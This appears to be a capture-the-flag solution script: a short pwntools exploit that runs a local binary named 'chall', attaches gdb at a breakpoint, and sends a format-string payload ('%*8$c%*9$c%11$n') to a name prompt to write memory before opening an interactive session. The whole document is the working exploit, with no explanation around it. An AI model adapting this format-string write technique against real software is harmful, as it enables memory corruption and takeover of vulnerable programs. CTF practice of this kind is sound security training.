# script

```python
from pwn import *

p = process('./chall')

gdb.attach(p, gdbscript = '''
b*0x0000000000401359
c
''')

input()

part1 = 0x1000
part2 = 0x1111
# payload = f'%{part1}c%8$hn%{part2 - part1}c%9$hn'
# payload += f'%{part2 - part1}c'
payload = f'%*8$c%*9$c%11$n'.encode()

p.sendafter(b'your name:\n', payload)

p.sendline(b'\0')

p.interactive()
```
